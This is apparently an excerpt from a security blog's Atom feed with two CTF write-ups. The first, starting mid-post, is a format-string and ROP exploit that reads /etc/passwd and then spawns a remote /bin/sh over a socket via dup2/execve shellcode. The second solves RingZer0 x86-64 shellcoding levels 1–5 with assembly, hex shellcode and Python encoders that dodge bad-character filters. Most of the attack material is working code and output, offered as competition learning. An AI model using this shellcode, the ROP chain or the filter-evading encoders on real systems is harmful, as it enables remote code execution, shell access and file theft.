ropchain += p(7)                   # flags; rwx
ropchain += p(SYSCALL)             # after executing this syscall, 0x400000 should be rwx

# we need to fetch the socket from memory
ropchain += p(libc_base + 0x2028a) # pop r15; ret
ropchain += p(-0x48)               #
ropchain += p(libc_base + 0x6933f) # lea rax, [rbp + r15]; set rax to address that contains socket descriptor
ropchain += p(31337)*5             # junk for all the pop r64's
ropchain += p(libc_base + 0xeb938) # mov rax, [rax]; grabs value of socket descriptor
ropchain += p(libc_base + 0x2c10e) # xchg eax, edi; edi now contains the socket descriptor

# read in the shellcode from the socket (sockfd in rdi already)
ropchain += p(POP_RAX)
ropchain += p(0)                   # syscall read
ropchain += p(POP_RSI)
ropchain += p(0x400000)            # start of buffer
ropchain += p(POP_RDX)
ropchain += p(0x1000)              # size of buffer
ropchain += p(SYSCALL)             # after this syscall, the shellcode should be at 0x400000
ropchain += p(0x400000)            # so return to it!

# rdi still contains socket fd!
s = socket(AF_INET, SOCK_STREAM)
s.connect(('pwn01.ringzer0team.com', 13377))

print s.recv(128)
# send our ropchain
s.send(ropchain)

time.sleep(0.1)
# modified read /etc/passwd, original by Mr.Un1k0d3r
s.send("\x49\x87\xff\xeb\x3e\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x90\x90\x90\x49\x87\xff\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbd\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41")

# handle the incoming connection; in this case, grab the contents of /etc/passwd
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>And the output!</p>

<pre><code class="bash">parameter 5 points to:  0x7fffb6657fc8
address pointed to by parameter 5 contains:  0x7fffb6658f51
scratch contains:  0x72632f656d6f682f
scratch is parameter 1123
[+] strlen is at 0x7f7af6e72c40.
[+] libc_base is at 0x7f7af6df2000.
[+] stack pivot gadget is at 0x7f7af6e74cfe.
[+] wrote 0x601b00 to 1123
[+] wrote 0x601b01 to 1124
[+] wrote 0x601b02 to 1125
[+] writing 0xe74cfe to strlen's GOT entry
[+] format string payload: %254c%1123$hhn%78c%1124$hhn%155c%1125$hhn

HF Remote Secure Shell [1.3.37]

Password:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshuser:x:1000:1000:sshuser,,,:/home/sshuser:/bin/bash
mysql:x:103:106:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
crackme:x:1001:1001::/home/crackme:/bin/sh
*** Connection closed by remote host ***
</code></pre>

<p>Cool, we have arbitrary code execution on the remote box! But remember, the goal was to get a shell&hellip;</p>

<h2>Shell&rsquo;s up</h2>

<p>The actual shellcode that landed me a shell uses <code>dup2</code> to duplicate stdin from the socket. This will allow us to communicate with the spawned shell. The assembly is quite straightforward. Not optimized, not pretty:</p>

<pre><code>bits 64

push rdi
push rdi
push 33         ; dup2
pop rax         ; set rax to dup2
                ; rdi still contains the socket fd
xor esi, esi    ; stdin
syscall
pop rdi
inc rsi         ; stdout
syscall
pop rdi
inc rsi         ; stderr
syscall

jmp _there
_here:
pop rdi         ; points to /bin/sh
xor esi, esi    ; argv = NULL
xor edx, edx    ; argp = NULL
push 59         ; execve
pop rax
syscall

push 60         ; exit
pop rax
syscall

_there:
call _here
db "/bin/sh", 0
</code></pre>

<p>After sticking that shellcode in the exploit, I got a shell!</p>

<pre><code class="python">s.send("\x57\x57\x6a\x21\x58\x31\xf6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\xeb\x0f\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00")
</code></pre>

<p><img src="/assets/maximum-overkill-two/01-interactive-shell-on-remote-box.png" alt="" /></p>

<p>You can see that the <code>dup2</code> shellcode is not completely effective; I needed to redirect stdout to stdin to get command output so somehow <code>dup2</code> does not duplicate stdout correctly. But hey, the objective is met! An interactive shell on an otherwise inaccessible server!</p>

<h2>Wrapping up</h2>

<p>This was a story of how a single format string vulnerability was beaten into arbitrary code execution. The exploit bypasses ASLR and NX via ROP, and finally sends over shellcode which will be executed. The CTF challenge was not designed with this in mind, but it was a fun exercise (and a potential warmup for Boston Key Party) nonetheless! My thanks go out to Mr.Un1k0d3r for being cool with me trying to break his challenge and even giving me the binary :)</p>

<p>Until the next #maximumoverkill :]</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Solving the X86-64 Shellcoding Challenges of RingZer0CTF]]></title>
    <link href="http://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/"/>
    <updated>2015-02-09T21:49:17+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf</id>
    <content type="html"><![CDATA[<p><a href="http://ringzer0team.com">RingZer0Team</a> is hosting a long-term CTF. The shellcoding challenges presented a very nice set of challenges. It was really fun <strong>and</strong> I learned a ton about 64-bit shellcoding while solving them!</p>

<!-- more -->


<p>I have redacted all the flags, because that would spoil things a bit too much. I did, however, try to verify all the shellcodes that are presented here. Sometimes, filenames may not match or errors may have creeped into the scripts during clean-up. For this, my apologies ;)</p>

<h2>Level 1</h2>

<p>Let&rsquo;s start easy. Upon connecting via <code>ssh</code>, the challenge presents us with the following:</p>

<pre><code>$ ssh level1@shellcode.ringzer0team.com -p 7771
level1@shellcode.ringzer0team.com's password: 
Linux ld64deb1 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
Last login: Sun Feb  1 19:36:20 2015 from 93.74.28.37

RingZer0 Team CTF Shellcoding Level 1
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have no shellcode restriction.
You main goal is to read /flag/level1.flag

shellcode&gt;
</code></pre>

<p>Although it says <em>no restriction</em>, there is one crucial restriction: NULL bytes are <strong>not</strong> allowed. This probably means that the shellcode is being copied to a buffer by <code>strcpy</code> or something similar. I found this out the hard way&hellip; Anyway, after realizing my mistake, I rebuilt my shellcode from the ground up, avoiding all NULL bytes. The shellcode is quite simple: it builds the filename on the stack, then opens that file, reads the contents onto the stack and finally writes off the contents to stdout. A very helpful link is this <a href="http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64">x64 syscall table</a> which lists all the syscalls and the arguments.</p>

<p>To avoid NULL bytes, registers can be zeroed by using <code>xor</code>. To set a byte-sized value, the value can be <code>push</code>ed and then <code>pop</code>ped into a register. Often, registers still hold their original value after a syscall and thus can be re-used.</p>

<pre><code>bits 64

_start:

mov dword [rsp], '/fla'     ; build filename on stack
mov dword [rsp+4], 'g/le'
mov dword [rsp+8], 'vel1'
mov dword [rsp+12], '.fla'
push 'g'
pop rcx
mov [rsp+16], ecx

lea rdi, [rsp]              ; rdi now points to filename '/flag/level1.flag'
xor rsi, rsi                ; rsi contains O_RDONLY, the mode with which we'll open the file
xor rax, rax
inc rax
inc rax                     ; syscall open = 2
syscall 

mov rbx, rax                ; filehandle of opened file

lea rsi, [rsp]              ; rsi is the buffer to which we'll read the file
mov rdi, rbx                ; rbx was the filehandle
push byte 0x7f              ; read 127 bytes. if we stay below this value, the generated opcode will not contain null bytes
pop rdx
xor rax, rax                ; syscall read = 0
syscall

lea rsi, [rsp]              ; the contents of the file were on the stack
xor rdi, rdi
inc rdi                     ; filehandle; stdout!
mov rdx, rax                ; rax was amount of bytes read by syscall read
xor rax, rax
inc rax
syscall                     ; syscall write = 1

push byte 60                ; some bytes left...
pop rax                     ; exit cleanly
syscall
</code></pre>

<p>To assemble and generate the shellcode in the format which the challenge wants, I used this command:</p>

<pre><code class="bash">$ echo; nasm -f bin ./level1-nonulls.asm; xxd -c 1 ./level1-nonulls | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./level1-nonulls

\xc7\x04\x24\x2f\x66\x6c\x61\xc7\x44\x24\x04\x67\x2f\x6c\x65\xc7\x44\x24\x08\x76\x65\x6c\x31\xc7\x44\x24\x0c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05
100 ./level1-nonulls
</code></pre>

<p>It spits out the shellcode, ready for copy &amp; paste, along with the size of the shellcode. Running it versus the server yields the flag!</p>

<h2>Level 2</h2>

<p>The password for level 2 is the flag of level 1. It seems the ante has been upped:</p>

<pre><code>RingZer0 Team CTF Shellcoding Level 2
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\x2e\x62\x99" max size 50 bytes.
You main goal is to read /flag/level2.flag
</code></pre>

<p>So the previous shellcode goes right out the window. I needed to cut it in half, length-wise. Also, not all characters are allowed, so-called <em>bad chars</em>. This will restrict the instructions we can use in the shellcode. Let&rsquo;s have a look at how we can trim the fat off of the shellcode of level 1.</p>

<p>First, hard-coding the filename is out of the question. That would waste at least 18 bytes, or 36% of the shellcode. Furthermore, it would contain the bad char <code>0x2f</code> which is the slash <code>/</code>. Instead, I decided to read in the name of the file with a syscall; the rest of the shellcode then takes care of opening that file, reading from it and sending the bytes back to us.</p>

<pre><code>bits 64

_start:
xor rax, rax        ; syscall read = 0
xor rdi, rdi        ; we'll read from stdin
mov rsi, rsp        ; one byte shorter than 'lea rsi, [rsi]'
push byte 18        ; number of bytes to read, enough for the filename
pop rdx
syscall 

xor rax, rax
inc rax
inc rax             ; syscall open
                    ; instead of setting rdi to the filename (located on the stack),
                    ; we re-use the fact that rdi is zero and rsi points to that filename
xchg rsi, rdi       ; now rsi = 0 (O_RDONLY), and rdi points to the filename we just read
syscall

xchg rax, rsi       ; after this, rsi contains the filehandle of the opened file, rax contains 0
xchg rdi, rsi       ; after this, rdi contains the filehandle and rsi points to the stack (a buffer!)
push byte 127
pop rdx             ; read 127 bytes, should be plenty
syscall             ; because we set rax to 0, this will call syscall read

xor rax, rax
inc rax             ; syscall write
mov rdi, rax        ; copy the value of rax to rdi (1 = stdout)
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; grab the flag!
</code></pre>

<p>Assembling the shellcode is done with the previous command. No bad chars made it into the shellcode, and we have one byte to spare!</p>

<pre><code>$ echo; nasm -f bin ./level2-shellcode.asm; xxd -c 1 ./level2-shellcode | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./level2-shellcode

\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x6a\x12\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x48\x87\xf7\x0f\x05\x48\x96\x48\x87\xfe\x6a\x7f\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x0f\x05
49 ./level2-shellcode
</code></pre>

<p>Running it on the server:</p>

<pre><code class="bash">shellcode&gt;\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x6a\x12\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x48\x87\xf7\x0f\x05\x48\x96\x48\x87\xfe\x6a\x7f\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x0f\x05
    Shellcode received...
    Shellcode length (49) bytes.

    Success: Executing shellcode...

/flag/level2.flag^@
FLAG-&lt;redacted&gt;
    Error: SIGSEGV received I think your shellcode is not working
</code></pre>

<p>After succesfully executing the shellcode, it demands input on stdin. Specifically, it needs the filename which we want to read. Notice that the filename is terminated with a NULL byte: this can be done by typing in the correct filename and then pressing <code>Ctrl+Space</code> to send a NULL byte. When done, pressing enter will yield the flag!</p>

<h2>Level 3</h2>

<pre><code class="bash">This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\x2e\x62\x48\x98\x99\x30\x31" max size 50 bytes.
You main goal is to read /flag/level3.flag
</code></pre>

<p>Again, fifty bytes maximum shellcode length, but more bad chars have been added. Unfortunately, the bad chars <code>0x48</code> and <code>0x31</code> make the use of <code>xor rax, rax</code> and the like impossible! Instead, to zero a register, something like this can be done:</p>

<pre><code>push byte 1     ; 0x6a, 0x01
pop rbx         ; 0x5b
dec bl          ; 0xff
</code></pre>

<p>This effectively clears <code>rbx</code>. This register also typically keeps it&rsquo;s original value after a syscall (it&rsquo;s non-volatile), so it&rsquo;s a good place to store something we&rsquo;ll use more often.</p>

<p>Furthermore, I like to use <code>xchg</code> to swap around contents of registers. However, if this is done on full 64-bit registers, the assembler generates a <code>0x48</code> byte, which is a bad char. Instead, the values can be passed around via the stack:</p>

<pre><code>; instruction   ; opcode
; --------------|-------
push rax        ; 0x50
push rbx        ; 0x53
pop rax         ; 0x58
pop rbx         ; 0x5b
</code></pre>

<p>The effect of this is that <code>rax</code> now contains the value of <code>rbx</code> and vice-versa. Without further ado, the shellcode for level 3:</p>

<pre><code>bits 64

_start:

push byte 1
pop rbx
dec bl              ; rbx is now zeroed out, avoiding the bad chars 0x31 and 0x48. 

push rbx
pop rax             ; rax is now zeroed out too. 

push rbx
pop rdi             ; stdin is zero, so zero out rdi as well

push rsp            ; make rsi point to the top of the stack
pop rsi             ; the buffer for syscall read

push byte 18        ; read in 18 bytes
pop rdx
syscall

push rbx
pop rax
inc al
inc al              ; syscall open

;xchg rsi, rdi      ; we cannot use this xchg opcode because of 0x48!
push rdi            ; instead, do the exchange of rsi and rdi via the stack
push rsi
pop rdi             ; rdi is now pointing to the filename on the stack
pop rsi             ; rsi is now zero (flag O_RDONLY)

syscall
                    ; pull a similar trick here, swapping around three registers
push rax            ; fd of just opened file
push rsi            ; rsi = 0
push rdi            ; rdi = pointer to top of stack
pop rsi             ; rsi = buf
pop rax             ; rax = 0 syscall read
pop rdi             ; rdi = fd

push byte 127
pop rdx             ; amount of bytes to read
syscall             ; syscall read

push rbx
pop rax
inc al              ; syscall write
push rax            ; copy rax (==1) to rdi
pop rdi             ; 1 = stdout
                    ; rsi = still pointing to buffer with contents of file
                    ; rdx = still 0x7f
syscall
</code></pre>

<p>Assembling it:</p>

<pre><code class="bash">$ echo; nasm -f bin ./shellcode3.asm; xxd -c 1 ./shellcode3 | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./shellcode3

\x6a\x01\x5b\xfe\xcb\x53\x58\x53\x5f\x54\x5e\x6a\x12\x5a\x0f\x05\x53\x58\xfe\xc0\xfe\xc0\x57\x56\x5f\x5e\x0f\x05\x50\x56\x57\x5e\x58\x5f\x6a\x7f\x5a\x0f\x05\x53\x58\xfe\xc0\x50\x5f\x0f\x05
47 ./shellcode3
</code></pre>

<p>Haha! No bad chars <em>and</em> three bytes to spare!</p>

<h2>Level 4</h2>

<p>I wasn&rsquo;t laughing anymore once I saw the restrictions placed on the shellcode of level 4:</p>

<pre><code>This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x48" max size 80 bytes.
</code></pre>

<p>This bans the use of <code>syscall</code>, which assembles to <code>0x0f, 0x05</code>. In theory, I think <code>int 0x80</code> (<code>cd 80</code>) could be used, but I haven&rsquo;t verified. The shellcode needs to be obfuscated and decoded at runtime somehow. I decided to make a very simple encoding &amp; decoding system: the bytes are simply increased by one. At runtime, a small stub of code is responsible for decrementing each byte to it&rsquo;s proper value.</p>

<p>I&rsquo;ve made use of a cool trick available on the 64-bit architecture: RIP-relative addressing. Normally, to get the address at which something is running, we&rsquo;d do this:</p>

<pre><code>jmp _over_the_shellcode         ; jmp short, assembles to 0xeb + 8 bit signed displacement

_getInstructionPointer:
pop rbx                         ; rbx now contains the address of _location

; ...shellcode bytes...

_over_the_shellcode:
call _getInstructionPointer     ; call backward, assembles to 0xe8 and a 32 bit signed displacement

_location:
</code></pre>

<p>However, this <code>jmp/call/pop</code> sequence to get the current location of code would introduce <code>0xff</code> bytes due to the relative call backwards. We can&rsquo;t use this, but luckily RIP-relative addressing comes to the rescue!</p>

<pre><code>lea rax, [rel _shellcode]    ; notice the use of the rel keyword!

_shellcode:
</code></pre>

<p>Again, however, due to the nature of this instruction (it uses a 32-bit displacement value) this would introduce NULL bytes. Instead, I decided to offset the value with a constant and then subtracting that constant. Finally, I needed to select a proper register. I settled on <code>r14</code>, because <code>rax</code> through <code>rdi</code> would introduce bad chars, and so would <code>r15</code>.</p>

<p>The decoder looks like this:</p>

<pre><code>bits 64


default rel                         ; we'll use relative addressing to get RIP

_start:
                                    ; we use r14, because this will avoid the 0x48 byte
                                    ; lea eax/ecx etc emits 0x48
lea r14, [rel _shellcode+0x12345678]; we can't use it directly, because of null bytes.
sub r14, 0x12345678                 ; restore the value in r14, so it points to the encoded shellcode.

push byte 43                        ; put amount of bytes to decode
pop rcx                             ; in rcx

_decode:
dec byte [r14]                      ; start at r14 (_fakecall)
add r14, 1                          ; 'decode' by adding 1
loop _decode                        ; decode `ecx` bytes.

_shellcode:                         ; place 'encoded' shellcode here
</code></pre>

<p>The actual shellcode is nearly the same one used above. It reads in the name of the file you want to read (terminate with <code>^@</code> or <code>0x00</code> by typing Ctrl+space). It then opens that file, reads from it, storing the data on the stack. It finally writes the contents of the file back to us.</p>

<pre><code>bits 64

_start:

push byte 0         ; we can use 0 here because we add 1 to each 
                    ; byte in the shellcode to 'encode' it.
pop rbx             ; store this value in rbx. We'll re-use it later.
push rbx            ; copy rbx...
pop rax             ; ...to rax. rax is now 0, the syscall for 'read'
push rbx            ; copy rbx...
pop rdi             ; ...to rdi: fd = stdin 
push rsp            ; copy rsp to rsi
pop rsi             ; rsi is the buffer to which we read the filename to open

push byte 18        ; the filename will be 18 bytes long
pop rdx             ; amount of byte to read
syscall             ; read in the filename

push rbx            ; rbx is still 0
pop rax             ; zero out rax
xor al, 2           ; syscall open. I had to use the xor here to avoid badchars after encoding this shellcode.
push rdi            ; switch around some registers. rdi = 0
push rsi            ; rsi = pointer to filename
pop rdi             ; rdi now points to filename to open
pop rsi             ; rsi = 0, which is O_RDONLY
syscall             ; open file

                    ; switch around the registers again. 
                    ; have to use the push/pops, because `xchg` would generate a badchar after encoding.
push rax            ; filehandle of just opened file
push rsi            ; rsi = 0
push rdi            ; rdi = pointer to top of stack
pop rsi             ; rsi = buf
pop rax             ; rax = 0 (syscall read)
pop rdi             ; rdi = filehandle
push byte 127       ; amount of bytes to read
pop rdx             ; in rdx
syscall             ; read in the contents of the file

push rbx            ; rbx is still 0
pop rax             ; zero out rax
xor al, 1           ; syscall write
push rax            ; copy rax to rdi
pop rdi             ; filehandle = 0 (stdout)
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; write to stdout; get me the flag!
ret                 ; return to handler program
</code></pre>

<p>Now, I could assemble these two shellcode pieces with <code>nasm</code>:</p>

<pre><code>$ nasm -f bin ./decoder.asm
$ nasm -f bin ./shellcode.asm
</code></pre>

<p>Then I wrote a small python program to do the actual encoding of the shellcode:</p>

<pre><code class="python">payload = ''

# read in the decoder
with open('decoder') as decoder:
    data = decoder.read()
    for i in data:
        payload += "\\x%02x" % ord(i)
    decoder.close()

# read in the shellcode &amp; encode it
with open('shellcode') as sc:
    data = sc.read()
    # for each byte, we add 1 to it and emit it.
    for i in data:
        payload += "\\x%02x" % (ord(i) + 1)
    sc.close()

# spit out payload!
print payload
</code></pre>

<p>After running this python script, I ended up with the completed shellcode:</p>

<pre><code class="python">$ python ./encode.py 
\x4c\x8d\x35\x8b\x56\x34\x12\x49\x81\xee\x78\x56\x34\x12\x6a\x2b\x59\x41\xfe\x0e\x49\x83\xc6\x01\xe2\xf7\x6b\x01\x5c\x54\x59\x54\x60\x55\x5f\x6b\x13\x5b\x10\x06\x54\x59\x35\x03\x58\x57\x60\x5f\x10\x06\x51\x57\x58\x5f\x59\x60\x6b\x80\x5b\x10\x06\x54\x59\x35\x02\x51\x60\x10\x06\xc4
</code></pre>

<p>As you can see, there are no badchars in this shellcode. We can send it over and grab the flag!</p>

<pre><code class="bash">RingZer0 Team CTF Shellcoding Level 4
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x48" max size 80 bytes.
You main goal is to read /flag/level4.flag

shellcode&gt;\x4c\x8d\x35\x8b\x56\x34\x12\x49\x81\xee\x78\x56\x34\x12\x6a\x2b\x59\x41\xfe\x0e\x49\x83\xc6\x01\xe2\xf7\x6b\x01\x5c\x54\x59\x54\x60\x55\x5f\x6b\x13\x5b\x10\x06\x54\x59\x35\x03\x58\x57\x60\x5f\x10\x06\x51\x57\x58\x5f\x59\x60\x6b\x80\x5b\x10\x06\x54\x59\x35\x02\x51\x60\x10\x06\xc4
    Shellcode received...
    Shellcode length (70) bytes.

    Success: Executing shellcode...

/flag/level4.flag^@
FLAG-&lt;redacted&gt;
Connection to shellcode.ringzer0team.com closed.
</code></pre>

<h2>Level 5</h2>

<p>Of course, level 5 increases the bad char list even further&hellip;</p>

<pre><code>Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68" and \x40 to \x65 max size 100 bytes.
</code></pre>

<p>We can no longer use the relative addressing with <code>lea</code>, because of the bad chars <code>0x49</code> and <code>0x48</code>. In fact, I was unable to get the address of the shellcode via any techniques I know.</p>

<p>I assumed that this shellcode is being executed via a instruction like <code>call rax</code>. That means that <code>rax</code> would still contain the pointer to the shellcode. If this is the case, we can re-use the value in <code>rax</code> as an index to the shellcode and use it to carve out the &lsquo;real&rsquo; shellcode via <code>xor</code> instructions. But let&rsquo;s first test this hypothesis. Time to get creative!</p>

<p>I made a small piece of shellcode that tests this hypothesis:</p>

<pre><code>bits 64

default rel

_start:
xor dword [rax+_temp-_start], 0x3d283d28        ; the xor will change the rets to jmp $-2!

nop
nop
nop
nop
nop
nop
nop

_temp:
ret
ret
ret
ret
</code></pre>

<p>When this code executes, the <code>xor</code> instruction should change the <code>ret</code> instructions to <code>jmp $-2</code>, or infinite loops (this works, because <code>c3 c3 c3 c3 xor 28 3d 28 3d</code> translates to <code>eb fe eb fe</code>). If <code>rax</code> does not point to the shellcode, I might get a SIGSEGV or the code simply exits.</p>

<p>Compiling it and sending it over, however, makes the program hang! This must means that the <code>ret</code>s were changed into <code>jmp</code> instructions, proving the hypothesis. We can use <code>rax</code> as a pointer to the shellcode! Now, we need to carve out the actual shellcode and execute it. I chose to use the same <code>xor</code> strategy. I made the <code>read/open/read/write</code> shellcode a lot smaller, managing to bring it down to 31 bytes. It contains bad chars again, but that&rsquo;s okay because I&rsquo;m gonna encode it anyway:</p>

<pre><code>bits 64

_start:

xor rax, rax        ; syscall read
push rax
pop rdi             ; rdi: fd = stdin 
push rsp
pop rsi             ; rsi points to stack, aka a buffer
push byte 127
pop rdx             ; read 127 bytes
syscall

mov al, 2           ; open; because we read less than 128 bytes, the rest of rax/eax/ax/ah will contain zeroes.
xchg rsi, rdi       ; rsi is now zero (O_RDONLY) and rdi points to the filename on the stack
syscall             ; open the file

xchg rax, rdi       ; after this, rax = pointer to the stack, rdi = filehandle
xchg rax, rsi       ; after this, rax = 0, rsi = pointer to the stack
syscall             ; read

mov al, 1           ; again, less than 128 bytes will be read
push rax
pop rdi             ; fd = stdout
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; write out contents of flag to stdout!
</code></pre>

<p>Next, I needed to carve out this shellcode using <code>xor</code> instructions. These instructions must not contain bad chars. Luckily, <code>xor dword ptr [rax+offset]</code> itself does not contain bad chars, or they can be avoided.</p>

<pre><code class="python">import struct

''' this function will try to locate a combination of two bytes that, when
    xor'ed, yield the required byte.
'''
def find_xor_bytes(b):
    for i in range(256):
        if i not in badchars:
            if ord(b) ^ i not in badchars:
                # return the two bytes that encode the required byte
                return chr(i), chr(ord(b) ^ i)
    print "cannot find proper byte for {}".format(b)
    exit(-1)

# build the bad char lookup array.
badchars = [0x0, 0xa, 0xd, 0x2f, 0xff, 0xf, 0x5, 0x68]
for i in range(0x40, 0x65):
    badchars.append(i)
# I got a bit paranoid and decided that these bytes were badchars too
for i in range(0x1, 0xf):
    badchars.append(i)

# read in the shellcode that we need to encode.
with open('modified-shellcode3') as sc:
    data = sc.read()
    sc.close()

# pad out the shellcode to a multiple of four
while len(data) % 4:
    data += "\xc3"

# ill-named variables to hold the encrypted bytes
storage = ''
encoded_bytes = ''
commands = ''
defines = ''
num_commands = 0

# iterate over each byte in the shellcode
for b in data:
    # try to find two bytes that are not badchars themselves
    (b1, b2) = find_xor_bytes(b)
    # store those bytes
    storage += b1
    encoded_bytes += b2
    # if there are four bytes stored, add them to the output &amp; start again
    if len(storage) == 4:
        # emit 
        commands += "xor dword [rax+_shellcode{}-_shellcode], {}\n".format(num_commands, hex(struct.unpack('&lt;L', storage)[0]))
        defines += "_shellcode{} dd {}\n".format(num_commands, hex(struct.unpack('&lt;L', encoded_bytes)[0]))
        storage = ''
        encoded_bytes = ''
        num_commands += 1

# output the resulting assembly 
print """bits 64
_start:

;mov rax, 10
;mov rdi, 0x400000
;mov rsi, 0x1000
;mov rdx, 7
;syscall
;lea rax, [_decoder]

_shellcode:
jmp _decoder
"""
print defines
print "_decoder:"
print commands
print "jmp _shellcode0"
</code></pre>

<p>This output the encoded shellcode as an assembly file. Using <code>nasm</code>, I could build it into shellcode again. For local testing, I included a call to <code>mprotect</code> and set the value of <code>rax</code> to the start of the shellcode, just like the situation on the remote server. The layout of the built shellcode (first encrypted bytes, then the decoder) is done on purpose: it avoids bad chars in the <code>xor dword [rax+offset]</code> instructions. The value for the offset should not be too high, as that would introduce bytes in the range <code>0x40</code> to <code>0x65</code>&hellip;</p>

<pre><code>bits 64
_start:

;mov rax, 10
;mov rdi, 0x400000
;mov rsi, 0x1000
;mov rdx, 7
;syscall
;lea rax, [_decoder]

_shellcode:
jmp _decoder
_shellcode0 dd 0x70d02169
_shellcode1 dd 0x7a7e747f
_shellcode2 dd 0x151f7a6f
_shellcode3 dd 0x976912a0
_shellcode4 dd 0x69151fe7
_shellcode5 dd 0x1f866987
_shellcode6 dd 0x7011a015
_shellcode7 dd 0xd3151f7f

_decoder:
xor dword [rax+_shellcode0-_shellcode], 0x20101021
xor dword [rax+_shellcode1-_shellcode], 0x10202020
xor dword [rax+_shellcode2-_shellcode], 0x10102010
xor dword [rax+_shellcode3-_shellcode], 0x10211010
xor dword [rax+_shellcode4-_shellcode], 0x21101010
xor dword [rax+_shellcode5-_shellcode], 0x10102110
xor dword [rax+_shellcode6-_shellcode], 0x20101010
xor dword [rax+_shellcode7-_shellcode], 0x10101020

jmp _shellcode0
</code></pre>

<p>Feeling quite chuffed, I assembled it and checked for bad chars&hellip; there was one! A <code>0x0a</code> byte snuck in. This was because the addresses of the encoded dwords were, relative to <code>rax</code>: 2, 6, 10, 14, etc. I needed to add an offset, which I did:</p>

<pre><code>_shellcode:
jmp _decoder
nop
nop
</code></pre>

<p>This took care of the problem. Yes, this shellcode could have been shorter, probably. A lot of the constants look similar, so I could have probably made the decoder smaller by selecting a &lsquo;magic&rsquo; constant. However, it worked!</p>

<pre><code class="bash">$ echo; nasm -f bin ./completed2.asm; xxd -c 1 ./completed2 | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./completed2

\xeb\x22\x90\x90\x69\x21\xd0\x70\x7f\x74\x7e\x7a\x6f\x7a\x1f\x15\xa0\x12\x69\x97\xe7\x1f\x15\x69\x87\x69\x86\x1f\x15\xa0\x11\x70\x7f\x1f\x15\xd3\x81\x70\x04\x21\x10\x10\x20\x81\x70\x08\x20\x20\x20\x10\x81\x70\x0c\x10\x20\x10\x10\x81\x70\x10\x10\x10\x21\x10\x81\x70\x14\x10\x10\x10\x21\x81\x70\x18\x10\x21\x10\x10\x81\x70\x1c\x10\x10\x10\x20\x81\x70\x20\x20\x10\x10\x10\xeb\xa6
94 ./completed2

$ ssh level5@shellcode.ringzer0team.com -p 7771level5@shellcode.ringzer0team.com's password: 
Linux ld64deb1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
Last login: Thu Feb  5 17:23:29 2015 from 137.224.219.201

